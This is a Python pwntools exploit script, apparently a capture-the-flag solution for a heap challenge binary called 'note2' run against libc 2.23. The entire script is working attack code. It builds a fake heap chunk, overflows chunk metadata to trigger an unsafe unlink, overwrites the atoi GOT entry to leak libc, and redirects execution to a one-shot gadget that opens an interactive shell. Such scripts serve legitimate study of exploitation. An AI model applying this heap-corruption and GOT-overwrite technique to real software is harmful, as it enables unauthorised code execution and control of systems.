from __future__ import print_function
from pwn import *

# Establish the target process, binary, and libc
target = process("./note2", env={"LD_PRELOAD":"./libc-2.23.so"})
elf = ELF('note2')
libc = ELF('libc-2.23.so')

# You were expecting a comment, BUT IT WAS ME DIO!
#gdb.attach(target)

# Establish our io functions
def addNote(content, size):
    print(target.recvuntil("option--->>"))
    target.sendline("1")
    print(target.recvuntil("(less than 128)"))
    target.sendline(str(size))
    print(target.recvuntil("content:"))
    target.send(content)

def editNote(index, content, app):
    print(target.recvuntil("option--->>"))
    target.sendline("3")
    print(target.recvuntil("note:"))
    target.sendline(str(index))
    print(target.recvuntil("2.append]"))
    target.sendline(str(app))
    print(target.recvuntil("TheNewContents:"))
    target.sendline(content)

def deleteNote(index):
    print(target.recvuntil("option--->>"))
    target.sendline("4")
    print(target.recvuntil("note:"))
    target.sendline(str(index))

def showNote(index):
    print(target.recvuntil("option--->>"))
    target.sendline("2")
    print(target.recvuntil("note:"))
    target.sendline("0")
    print(target.recvuntil("Content is "))
    leak = target.recvline().strip("\x0a")
    leak = u64(leak + "\x00"*(8-len(leak)))
    return leak

# Send data for the address / name
# For our exploit, this really doesn't matter (much like Aqua)
target.sendline("15935728")
target.sendline("15935728")


ptr = 0x602120

fakeChunk = ""

fakeChunk += p64(0x0)            # Previous Size
fakeChunk += p64(0xa0)            # Size
fakeChunk += p64(ptr - (0x8*3))        # FD ptr
fakeChunk += p64(ptr - (0x8*2))        # BK ptr
fakeChunk += p64(0x0)            # FD Next Size

# Allocate the heap chunk and store the fake chunk
addNote(fakeChunk, 0x80)

# For me, IO For this challenge was a bit weird. I needed to insert lines like these in order
# for the input the happen properly.
target.sendline("1")

# Add the second chunk, which will free and reallocate for the overflow
addNote("1"*0x8, 00)
target.sendline("1")

# This is the third chunk which we will overflow it's heap metadata to point to the fake chunk as a freed previous chunk
addNote("2"*0x80, 0x80)
target.sendline("1")

# Free the second chunk, reallocate it and overflow the heap metatda's previous size and size
deleteNote(1)

addNote("5"*0x10 + p64(0xa0) + p64(0x90), 0)
target.sendline("1")


# Free the third chunk (with the overwritten heap metadata) to execute the unlink
deleteNote(2)

# Now that the unlink happened, write the got entry address for atoi to the heap pointers array
editNote(0, "6"*24 + p64(elf.got['atoi']), 1)

# Leak the libc address of atoi, calculate our oneshot gadget address
leak = showNote(0)
libcBase = leak - libc.symbols['atoi']
oneShot = libcBase + 0xf02a4

print("libc base: " + hex(libcBase))
print("oneshot gadget: " + hex(oneShot))

# Write over the got entry for atoi with the oneshot gadget
editNote(0, p64(oneShot), 1)

# Send the string "1" to call atoi, call our oneshot gadget and get a shell
target.sendline("1")

target.interactive()